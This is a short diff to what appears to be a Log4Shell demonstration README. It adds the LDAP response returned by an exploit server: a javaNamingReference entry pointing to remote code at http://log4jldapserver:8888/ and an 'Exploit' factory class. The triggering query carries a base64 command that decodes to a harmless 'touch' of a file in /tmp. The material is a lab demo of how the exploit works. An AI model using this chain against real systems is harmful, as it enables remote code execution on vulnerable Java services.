@@ -91,6 +91,32 @@ $> tcpdump -i eth0 -w /tmp/dump.cap &
 $> ldapsearch -p 1389 -h log4jldapserver -x -b "Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw=="
 ```
 
+```shell
+# ldap search response
+
+# extended LDIF
+#
+# LDAPv3
+# base <Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+#
+dn: Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==
+javaClassName: foo
+javaCodeBase: http://log4jldapserver:8888/
+objectClass: javaNamingReference
+javaFactory: ExploitzhlIBZLvCq
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+```
+
 ## Notes
 
 ### Log4j Lookup Feature
